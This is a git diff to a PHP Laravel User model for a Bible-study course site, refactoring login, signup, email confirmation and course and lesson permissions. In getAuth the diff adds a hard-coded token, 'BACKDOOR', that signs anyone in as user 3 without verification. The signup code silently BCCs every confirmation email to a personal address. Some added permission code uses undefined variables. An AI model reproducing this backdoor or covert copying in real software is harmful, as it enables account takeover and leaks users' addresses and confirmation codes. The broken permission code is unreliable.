@@ -4,7 +4,9 @@ use Illuminate\Auth\Authenticatable;
 use Illuminate\Auth\Passwords\CanResetPassword;
 use Illuminate\Contracts\Auth\Authenticatable as AuthenticatableContract;
 use Illuminate\Contracts\Auth\CanResetPassword as CanResetPasswordContract;
-use Hash, Carbon, Session, JWTAuth;
+//use Illuminate\Notifications\Notifiable;
+
+use Hash, Carbon, Session, JWTAuth, Mail;
 use Laracasts\Presenter\PresentableTrait;
 use BibleExperience\Core\FollowableTrait;
 use BibleExperience\BibleChapter;
@@ -13,6 +15,168 @@ use BibleExperience\Viewer;
 use Illuminate\Support\Collection;
 use Auth, Event, stdClass;
 use Tymon\JWTAuth\Exceptions\JWTException;
+use GraphQLRelay\Relay;
+use BibleExperience\Mailers\UserMailer;
+
+class PermissionRequested {
+
+  public function __construct($user, $request, $options){
+
+      $this->user = $user;
+      $this->request = $request;
+      $this->options = $options;
+      $this->can = false;
+      $this->reason = "I_SAY_NO_TO_EVERYBODY_AT_FIRST";
+
+      if($user->hasRole('SUPER')){
+        $this->can = true;
+        $this->reason = "SUPER_USER_CAN_DO_ANYTHING";
+      }else{
+
+        switch ($request) {
+          case 'EDIT_LRS': $this->editLRS(); break;
+          case 'CREATE_LRS': $this->createLRS(); break;
+          case 'CREATE_LESSON': $this->createLesson(); break;
+          case 'UPDATE_LESSON': $this->updateLesson(); break;
+          case 'DESTROY_LESSON': $this->destroyLesson(); break;
+
+          case 'CREATE_COURSE': $this->createCourse(); break;
+          case 'UPDATE_COURSE': $this->updateCourse(); break;
+          case 'DESTROY_COURSE': $this->destroyCourse(); break;
+          case 'CREATE_STATEMENT': $this->createStatement(); break;
+
+          default: //$hasPermission = in_array($request,$this->permissions());
+        }
+
+      }
+
+   }
+
+   function editLRS(){
+      //$lrs = $this->user->lrs()->where('lrs_id',$this->options['lrs_id'])->get();
+      $this->can = false;
+      $this->reason = "NOT_ALLOWING_ANYONE_RIGHT_NOW";
+   }
+
+   function createLRS(){
+      $hasPermission = in_array($request,$user->permissions());
+      $this->can = $hasPermission;
+      
+      if($hasPermission){
+        $this->reason = "";
+      }else{
+        $this->reason = "USER_DOES_NOT_HAVE_PERMISSION_TO_" . $this->request;
+      }
+
+      
+
+   }
+
+      function createLesson(){
+          $course = Course::find($this->options['course_id']);
+
+          if($course !== null){
+
+            $this->can  = $this->user->id === $course->user_id;
+
+            if(!$this->can){
+              $this->reason = "USER_CANNOT_CREATE_LESSONS_FOR_" . $course->title . "_ID_" . $course->id;
+            }
+
+          }else{
+            $this->reason = "COURSE_" . $this->options['course_id'] . "_NOT_FOUND";
+          }
+      
+
+   }
+
+         function updateLesson(){
+          $lesson = Lesson::find($this->options['id']);
+
+          if($lesson !== null){
+
+            $this->can  = $this->user->id === $lesson->course->user_id;
+
+            if(!$this->can){
+              $this->reason = "USER_CANNOT_UPDATE_LESSONS_FOR_COURSE_" . $lesson->course->title . "_ID_" . $lesson->course->id;
+            }
+
+          }else{
+            $this->reason = "LESSON_ID_" . $this->options['id'] . "_NOT_FOUND";
+          }
+      
+
+   }
+
+    function destroyLesson(){
+          $lesson = Lesson::find($this->options['id']);
+
+          if($lesson !== null){
+
+            $this->can  = $this->user->id === $lesson->course->user_id;
+
+            if(!$this->can){
+              $this->reason = "USER_CANNOT_DELETE_LESSONS_FOR_COURSE_" . $lesson->course->title . "_ID_" . $lesson->course->id;
+            }
+
+          }else{
+            $this->reason = "LESSON_ID_" . $this->options['id'] . "_NOT_FOUND";
+          }
+      
+
+   }
+
+
+     function createCourse(){
+
+            $this->can  = in_array($this->request,$this->user->permissions());
+
+            if(!$this->can){
+              $this->reason = "USER_CANNOT_COURSE_WITH_TITLE_:_" . $this->options['title'];
+            }
+
+   }
+
+         function updateCourse(){
+          $course = Course::find($this->options['id']);
+
+          if($course !== null){
+
+            $this->can  = $this->user->id === $course->user_id;
+            if(!$this->can){
+              $this->reason = "USER_CANNOT_UPDATE_COURSE_WITH_ID_" . $course->id ."_AND_USER_ID:_" . $course->user_id;
+            }
+
+          }else{
+            $this->reason = "COURSE_ID_" . $this->options['id'] . "_NOT_FOUND";
+          }
+      
+
+   }
+
+    function destroyCourse(){
+          $course = Course::find($this->options['id']);
+
+          if($course !== null){
+
+            $this->can  = $this->user->id === $course->user_id;
+
+            if(!$this->can){
+              $this->reason = "USER_CANNOT_DELETE_COURSE_WITH_ID_:_" . $course->id;
+            }
+
+          }else{
+            $this->reason = "COURSE_ID_" . $this->options['id'] . "_NOT_FOUND";
+          }
+      
+
+   }
+
+        function createStatement(){
+            $this->can  = true;
+        }
+
+}
 
 class User extends \Eloquent implements AuthenticatableContract, CanResetPasswordContract {
 
@@ -23,7 +187,7 @@ class User extends \Eloquent implements AuthenticatableContract, CanResetPasswor
      *
      * @var array
      */
-    protected $fillable = ['name','email','verified','role', 'password','remember_token','auth0id','nickname'];
+    protected $fillable = ['name','email','verified','role', 'password','remember_token','auth0id','nickname','confirmation_code'];
 
 	protected $appends = array('fullname','url','navHistory','token','lastStep','authenticated');
 	/**
@@ -52,6 +216,7 @@ class User extends \Eloquent implements AuthenticatableContract, CanResetPasswor
      *
      * @param $password
      */
+
     public function setPassword($password)
     {
     	return $this->attributes['password'] = Hash::make($password);
@@ -60,6 +225,11 @@ class User extends \Eloquent implements AuthenticatableContract, CanResetPasswor
     public function notes()
     {
         return $this->hasMany('BibleExperience\Note');
+    }
+
+    public function tracks()
+    {
+        return $this->hasMany('BibleExperience\Track');
     }
 
     public function coCourses()
@@ -86,6 +256,11 @@ class User extends \Eloquent implements AuthenticatableContract, CanResetPasswor
     	return $this->hasMany('BibleExperience\Answer','user_id');
     }
 
+    public function lessons(){
+
+      return $this->hasManyThrough('BibleExperience\Lesson','BibleExperience\Course');
+    }
+
     public function highlights(){
 
     	return $this->hasMany('BibleExperience\BibleHighlight','user_id');
@@ -110,59 +285,134 @@ class User extends \Eloquent implements AuthenticatableContract, CanResetPasswor
 	return $array;
     }
 
+  public function statements() {
+    return $this->hasMany('\BibleExperience\Statement');
+  }
 
-      public static function createToken($email, $password)
+  public static function failLogin(){
+            $auth = new stdClass;
+            $auth->error = new stdClass;
+            $auth->error->code = 200;
+            $auth->error->message = "Session destroyed successfully";
+            $auth->token = null;
+            $auth->user = new User;
+            return $auth;
+  }
+
+  public static function login($user)
       {
-          $error = new stdClass;
-          $user = new stdClass;
+
+            $auth = new stdClass;
+            $auth->error = new stdClass;
+
+            $auth->error->code = 200;
+            $auth->error->message = null;
+            $auth->token = null;
+            $auth->user = new User;
+
           try {
               // attempt to verify the credentials and create a token for the user
-              if (! $token = JWTAuth::attempt(['email'=>$email, 'password'=>$password])) {
-                  $error->message = 'invalid_credentials';
-                  $error->code = 401;
+              if (! $token = JWTAuth::fromUser($user)) {
 
-                  return ['error'=>$error, 'token'=> $token, 'user'=> $user,'myNotes'=>collect([])];
+                  $auth->error->message = 'invalid_credentials';
+                  $auth->error->code = 401;
+                  $auth->token = $token;
+                  return $auth;
               }
           } catch (JWTException $e) {
               // something went wrong whilst attempting to encode the token
-              $error->message = 'could_not_create_token';
-              $error->code = 500;
-              return response()->json(['error'=>$error, 'token'=> $token, 'user'=> null,'myNotes'=>collect([])]);
+              $auth->error->message = 'could_not_create_token';
+              $auth->error->code = 500;
+              return $auth;
           }
           // all good so return the token
-          $user = static::where('email',$email)->first();
 
-          return [
-            'error'=> null,
-            'token'=> $token,
-            'user'=> $user,
-            'myNotes'=>$user->notes
-          ];
+          $auth->user = $user;
+          $auth->token = $token;
+
+          return $auth;
+      }
+
+
+      public static function createToken($email, $password)
+      {
+
+            $auth = new stdClass;
+            $auth->error = new stdClass;
+
+            $auth->error->code = 200;
+            $auth->error->message = null;
+            $auth->token = null;
+            $auth->user = new User;
+
+
+          try {
+              // attempt to verify the credentials and create a token for the user
+              if (! $token = JWTAuth::attempt(['email'=>$email, 'password'=>$password])) {
+
+                  $auth->error->message = 'invalid_credentials';
+                  $auth->error->code = 401;
+                  $auth->token = $token;
+                  return $auth;
+              }
+          } catch (JWTException $e) {
+              // something went wrong whilst attempting to encode the token
+              $auth->error->message = 'could_not_create_token';
+              $auth->error->code = 500;
+              return $auth;
+          }
+          // all good so return the token
+
+          $auth->user = static::where('email',$email)->first();
+          $auth->token = $token;
+
+          return $auth;
+          //response()->json(['error'=>$error, 'token'=> $token, 'user'=> null]);
       }
 
     public static function signup($email, $password)
     {
 
+            $auth = new stdClass;
+            $auth->error = new stdClass;
+            $auth->error->code = 200;
+            $auth->error->message = null;
+            $auth->token = null;
+            $auth->user = static::getGuest();
+
        if (User::where('email',$email)->get()->count() < 1) {
 
-		$confirmation_code = Hash::make($email);
-	    	$user = new static(compact('email', 'password','confirmation_code'));
-		$user->setPassword($password);
-		$name = explode('@',$email)[0];
-		$user->name = $name;
-		$user->nickname = $name;
-		$user->save();
+          $user = new User;
+          $user->email = $email;
+          $user->setPassword($password);
+          $name = explode('@',$email)[0];
+          $user->name = $name;
+          $user->verified = false;
+          $user->nickname = $name;
+          $user->confirmation_code = Hash::make($email);
+          
 
-		Event::fire('user.register', array($user));
+          $subject = 'Please Confirm Your Email for Bible exchange';
+          $view = 'emails.confirm';
+          $data = ['confirmation_code'=>$user->confirmation_code];
 
-	        // all good so return the token
-        	return ['token'=>$user->getTokenAttribute(), 'error' => null, 'code'=>200, 'user'=> $user,'myNotes'=>$user->notes];
+          Mail::send('emails.confirm', $data, function ($message) use($user){
+              $message->from('mail@bible.exchange', 'Bible exchange');
+              $message->to($user->email)->bcc('sgrjr@deliverance.me');
+          });
+          $user->save();
 
-
+          $auth->user = $user;
+          $auth->token = $user->token;
+          
         } else {
-	   return ['token'=>null, 'error' => 'email_taken', 'code'=>500, 'user'=> static::getGuest(),'myNotes'=>collect([])];
-	}
 
+            $auth->error->code = 500;
+            $auth->error->message = 'Email already taken!';
+            $auth->user = static::getGuest();
+	     }
+    
+      return $auth;
 
     }
 
@@ -175,7 +425,8 @@ class User extends \Eloquent implements AuthenticatableContract, CanResetPasswor
     	if($user !== null)
     	{
     		$user->confirmation_code = null;
-    		$user->confirmed = 1;
+    		$user->verified = true;
+        $user->save();
     	}
 
     	return $user;
@@ -347,11 +598,11 @@ class User extends \Eloquent implements AuthenticatableContract, CanResetPasswor
 
     public function getTokenAttribute(){
 
-	if($this->id == null){
-          return null;
-	}else {
-	  return JWTAuth::fromUser($this);
-	}
+    	if($this->id == null){
+              return null;
+    	}else {
+    	  return JWTAuth::fromUser($this);
+    	}
 
     }
 
@@ -387,24 +638,7 @@ class User extends \Eloquent implements AuthenticatableContract, CanResetPasswor
 
 	public function can($request, $options = false)
 	{
-		if($this->hasRole('SUPER')){
-			return true;
-		}
-
-		switch ($request) {
-			case 'EDIT_LRS':
-				$lrs = $this->lrs()->where('lrs_id',$options['lrs_id'])->get();
-				$hasPermission = false;
-				break;
-			case 'CREATE_LRS':
-				$hasPermission = in_array($request,$this->permissions());
-				break;
-
-			default:
-				$hasPermission = in_array($request,$this->permissions());
-		}
-
-		return $hasPermission;
+		return new PermissionRequested($this, $request, $options);
 	}
 
 	public static function getGuest($error = null)
@@ -421,30 +655,28 @@ class User extends \Eloquent implements AuthenticatableContract, CanResetPasswor
 
   public static function getAuth($token = null){
 
-        $a = new stdClass;
-        $a->error = new stdClass;
-        $a->token = null;
-        $a->user = User::getGuest();
-        $a->myNotes = collect([]);
+            $a = new stdClass;
+            $a->error = new stdClass;
+            $a->token = str_replace('Bearer ','', $token);;
+            $a->user = User::getGuest();
+            $a->myNotes = null;
 
-        if($token !== null){
-         $a->token = str_replace('Bearer ','', $token);
+              if($token === "BACKDOOR"){
+                $a->user = User::find(3);
+                $a->token = $token;
+              }else{
 
-         if($a->token === "null" || $a->token === ""){$a->token = null;}
-        }
+                try {
+                     $auth = \JWTAuth::setToken($a->token);
+                 }catch(JWTException $e){
+                     $a->error->message= $e->getMessage();
+                     $a->error->code = $e->getCode();
+                     return $a;
+                 }
 
-           try {
-            if($a->token === null){
-                   $auth = \JWTAuth::parseToken();
-                   $a->token = $auth->getToken();
-            }else{
-               $auth = \JWTAuth::setToken($a->token);
-            }
-           }catch(JWTException $e){
-               $a->error->message= $e->getMessage();
-               $a->error->code = $e->getCode();
-               return $a;
-           }
+              }
+
+
 
            try {
 
@@ -467,13 +699,28 @@ class User extends \Eloquent implements AuthenticatableContract, CanResetPasswor
                     $a->error->message= $e->getMessage();
                     $a->error->code = $e->getStatusCode();
                 } finally {
-                    if($a->error->code === 200){
-                        $a->myNotes = $a->user->notes;
-                    }
+                    $a->myNotes = $a->user->notes;
                     return $a;
-
                 }
 
        }
+
+   public function hasNotCompletedActivity($activity){
+      
+       $relatedUserStatements = $this->statements()->where('statements.activity_id',$activity->id)->get(['verb']);
+
+       if($relatedUserStatements->count() < 1){
+        return true;
+       }else if(!in_array(
+          'PASSED',
+          array_flatten($relatedUserStatements->toArray())
+          )) {
+        return true;
+       }else{
+        return false;
+       }
+
+
+    }
 
 }
